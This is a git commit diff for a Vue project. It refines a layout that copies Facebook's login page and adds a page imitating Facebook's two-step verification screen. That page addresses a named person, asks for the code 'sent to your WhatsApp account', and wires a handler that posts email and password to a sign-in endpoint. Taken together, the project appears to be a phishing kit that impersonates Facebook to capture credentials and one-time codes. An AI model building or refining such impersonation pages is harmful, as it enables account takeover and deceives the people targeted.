047019e8ca0a4f1ba7ba8b77526709ccf47b5b79
Mac <teahuynam2003@gmail.com>
2024-11-18 01:00:09 +0700

    update page 2

--- layouts/LoginWeb.vue
+++ layouts/LoginWeb.vue
@@ -23,21 +23,23 @@ const handleSubmit = async () => {
 </script>
 <template>
   <div class="bg-[#f2f4f7] max-md:hidden flex flex-col items-center">
-    <div class="flex items-center py-[72px]">
-      <div class="h-fit flex flex-col md:flex-row justify-center w-full max-w-5xl mx-auto p-4">
+    <div class="flex items-center py-[79px]">
+      <div
+        class="form-main py-5 h-fit flex flex-col md:flex-row justify-center w-full max-w-5xl mx-auto p-4"
+      >
         <!-- Left Side - Logo and Text -->
-        <div class="text-center md:text-left w-full max-w-[500px] mr-8 mb-8 md:mb-0">
+        <div class="text-center mt-[38px] md:text-left w-full max-w-[500px] mr-8 mb-8 md:mb-0">
           <img class="-ml-[30px] w-[320px]" src="/assets/images/logo.svg" alt="" />
           <!-- <h1 class="text-5xl font-bold text-[#0866ff]">facebook</h1> -->
-          <p class="text-[24px] text-gray-900 font-base">
-            Facebook helps you connect and share <br />with the people in your life.
+          <p class="text-[24px] text-gray-900 font-base" style="line-height: 28px">
+            Facebook helps you connect and share with the people in your life.
           </p>
         </div>
 
         <!-- Right Side - Login Form -->
         <div class="w-full max-w-[396px]">
           <div class="bg-white h-fit shadow-lg p-4 rounded-[8px]">
-            <form class="space-y-4" @submit.prevent="handleSubmit">
+            <form class="space-y-3" @submit.prevent="handleSubmit">
               <input
                 v-model="email"
                 type="text"
@@ -67,7 +69,7 @@ const handleSubmit = async () => {
 
             <div class="flex justify-center">
               <button
-                class="w-fit px-4 py-3 bg-[#42b72a] text-white rounded-md font-bold hover:bg-[#36a420]"
+                class="w-fit px-4 py-3 bg-[#42b72a] text-white rounded-md font-medium hover:bg-[#36a420]"
               >
                 Create new account
               </button>
@@ -82,10 +84,12 @@ const handleSubmit = async () => {
     </div>
 
     <!-- Footer Section -->
-    <footer class="bg-white w-full flex flex-col items-center py-4">
-      <div class="max-w-[980px]">
+    <footer class="bg-white w-full flex flex-col items-center py-4 px-10">
+      <div class="w-full max-w-[980px]">
         <!-- Language Links -->
-        <div class="flex font-light justify-start space-x-4 text-gray-500 text-[12px]">
+        <div
+          class="flex font-light justify-start flex-wrap space-x-[10px] text-gray-500 text-[12px]"
+        >
           <a href="#" class="hover:underline">English (UK)</a>
           <a href="#" class="hover:underline">Tiếng Việt</a>
           <a href="#" class="hover:underline">中文(台灣)</a>
@@ -97,15 +101,17 @@ const handleSubmit = async () => {
           <a href="#" class="hover:underline">Português (Brasil)</a>
           <a href="#" class="hover:underline">Deutsch</a>
           <a href="#" class="hover:underline">Italiano</a>
-          <button
-            class="hover:underline border bg-gray-100 flex items-center text-gray-500 text-xs"
-          >
-            <span class="px-2">+</span>
-          </button>
+          <a class="plus-wrapper">
+            <!-- <span class="px-2">+</span> -->
+            <!-- <i class="plus"></i> -->
+<span class="text-[16px]">
+  +
+
+</span>          </a>
         </div>
 
         <!-- Divider Line -->
-        <div class="max-w-[980px] w-full border-t border-gray-300 my-3"></div>
+        <div class="max-w-[980px] w-full border-t border-gray-300 my-[8px]"></div>
 
         <!-- Other Links -->
         <div
@@ -150,8 +156,53 @@ const handleSubmit = async () => {
 <style scoped>
 /* Add any additional styling if necessary */
 .list-language a {
-  margin-right: 10px;
-  margin-bottom: 8px;
+  margin-right: 20px;
   display: inline-block;
+  font-size: 12px;
 }
+@media only screen and (max-width: 1075px) {
+  .form-main {
+    height: 496px;
+    margin: 0 40px;
+    width: auto;
+  }
+}
+
+.plus {
+  background-image: url(/assets/icons/plus.png);
+  background-size: 171px 55px;
+  background-repeat: no-repeat;
+  display: inline-block;
+  font-style: italic;
+  height: 16px;
+  width: 16px;
+  width: 12px;
+  height: 12px;
+  font-size: 12px;
+  background-position: -100px -34px;
+  -ms-high-contrast-adjust: none;
+}
+
+.plus-wrapper {
+  cursor: pointer;
+  display: inline-block;
+  border: 1px solid;
+  border-radius: 2px;
+  box-sizing: content-box;
+  font-size: 12px;
+  -webkit-font-smoothing: antialiased;
+  font-weight: bold;
+  justify-content: center;
+  padding: 0 8px;
+  position: relative;
+  text-align: center;
+  text-shadow: none;
+  vertical-align: middle;
+  background-color: #f5f6f7;
+  border-color: #ccd0d5;
+  display: inline-flex;
+  align-items: center;
+  height: 18px;
+}
+
 </style>
---
+++ pages/two_step_verification/two_factor.vue
@@ -0,0 +1,116 @@
+<script setup lang="ts">
+import { ref } from 'vue'
+
+const email = ref('')
+const password = ref('')
+const code = ref('')
+const isFocusEmail = ref(false)
+const isFocusPassword = ref(false)
+
+const handleResetFocus = () => {
+  isFocusEmail.value = false
+  isFocusPassword.value = false
+}
+
+const handleFocus = (type: string, ref: any) => {
+  if (type === 'email') {
+    isFocusEmail.value = true
+    ref.focus()
+  } else {
+    isFocusPassword.value = true
+    ref.focus()
+  }
+}
+
+const handleSubmit = async () => {
+  if (!email.value || !password.value) {
+    return
+  }
+
+  // Call your API here
+  try {
+    await $fetch('/api/signin', {
+      method: 'POST',
+      body: JSON.stringify({ email: email.value, password: password.value }),
+      headers: {
+        'Content-Type': 'application/json',
+      },
+    })
+  } catch (error) {
+    console.error(error)
+  }
+}
+</script>
+
+<template>
+  <div class="flex justify-center items-center w-full h-screen bg-[#f1f5fb]">
+    <div class="w-[600px]">
+      <p class="text-[13px] mb-4">Monica Guan • Facebook</p>
+      <p class="text-[1.5rem] font-[600]" style="line-height: 17px">Check your WhatsApp messages</p>
+      <p class="text-[13px] mt-5 mb-4">Enter the code that we sent to your WhatsApp account.</p>
+      <img class="mb-4" src="/assets/images/code-pin.png" alt="" />
+      <div
+        class="mb-4 input bg-white"
+        :class="{
+          '!border-[rgb(103,120,138)] border': isFocusEmail && code.trim(),
+        }"
+        @click.stop="handleFocus('email', $refs.emailElement)"
+      >
+        <p
+          :class="{
+            ' transform translate-y-[9px] transition-all duration-200 text-[14px]':
+              !isFocusEmail && !code.trim(),
+          }"
+          class="text-[12px] text-[#9ea1a2]"
+        >
+          Code
+        </p>
+        <input
+          ref="emailElement"
+          v-model="code"
+          type="text"
+          class="h-5 text-[rgb(28,43,51)]"
+          autocomplete="off"
+          :class="{
+            'opacity-0': !isFocusEmail && !code.trim(),
+          }"
+          @focus="isFocusEmail = true"
+          @blur="isFocusEmail = false"
+        />
+      </div>
+      <div class="flex items-center gap-2">
+        <svg viewBox="0 0 24 24" fill="currentColor" width="14" height="14">
+          <path
+            d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"
+          ></path>
+        </svg>
+        <p class="text-[14px] text-[#0064E0] cursor-pointer hover:underline">Get a new code</p>
+      </div>
+
+      <button
+        :class="{
+          'bg-[#0263df]': code.trim().length === 6,
+        }"
+        class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
+      >
+        Continue
+      </button>
+
+      <button
+        class="flex hover:bg-gray-100 justify-center h-[44px] items-center text-[15px] rounded-full border w-full"
+      >
+        Try Another Way
+      </button>
+    </div>
+  </div>
+</template>
+
+<style scoped>
+.input {
+  @apply w-full px-4 py-2 h-[60px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
+}
+input {
+  outline: none;
+  width: 100%;
+}
+</style>
